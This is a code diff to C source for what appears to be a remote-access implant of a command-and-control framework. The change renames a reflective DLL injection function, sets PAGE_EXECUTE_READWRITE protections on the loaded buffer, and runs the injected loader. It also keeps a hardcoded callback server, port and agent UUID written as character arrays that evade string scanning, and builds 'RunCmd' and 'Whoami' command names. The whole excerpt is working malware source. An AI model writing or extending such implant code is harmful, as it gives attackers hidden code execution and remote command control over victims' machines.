@@ -5,11 +5,7 @@
 #include "../include/http.h"
 #include "../include/typedefs.h"
 
-// will be overriden by ImhulluCLI
-//#define SERVER '1','9','2','.','1','6','8','.','0','.','1',0
-//#define PORT 5001
-//#define UUID '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
-
+// will be overwritten by ImhulluCLI
 #ifndef SERVER_M
 #define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
 #endif
@@ -20,14 +16,13 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
-//HANDLE loaderInjectRD(PAPI api, LPVOID lpDll, DWORD dwDllSize)
-HANDLE loaderInjectRD(PAPI api, PDLL pDll)
+HANDLE executeRD(PAPI api, PDLL pDll)
 {
     DWORD loaderOffset;
     REFLECTIVELOADER pReflectiveLoader;
     DLLMAIN pDllMain;
 
-    //loaderOffset = GetRLOffset(api, lpDll);
+    // get the offset of the reflective loader
     loaderOffset = GetRLOffset(api, pDll->Buffer);
 
     #ifdef DEBUG
@@ -36,21 +31,25 @@ HANDLE loaderInjectRD(PAPI api, PDLL pDll)
     ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->Buffer + loaderOffset);
     #endif
 
-    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
-    //pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);
+    // get the real address of the reflective loader, cast it to a function
     pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->Buffer + loaderOffset);
 
+    // TODO: Revert PAGE_EXECUTE_READWRITE protections
+    // TODO: Use PAGE_EXECUTE_READ protections instead
     DWORD dwOldProtect;
+    // give the memory region that holds the reflective loader execute-read-write permissions
     ((VIRTUALPROTECT)api->VirtualProtect)(pDll->Buffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-    HANDLE hDllBase = NULL;
-
+    // run the reflective loader
+    // reflective loader returns an address to DLLMain, cast it to a function pointer
     pDllMain = (DLLMAIN)pReflectiveLoader();
 
     #ifdef DEBUG
     CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
     ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
     #endif
+
+    HANDLE hDllBase = NULL;
 
     if( pDllMain != NULL )
     {
@@ -295,8 +294,7 @@ void myMain()
     ESG_STD_API EsgStdApi = { 0 };
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
-    //pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
-    pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll);
+    pEsgStdDll->Buffer = executeRD(api, pEsgStdDll);
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
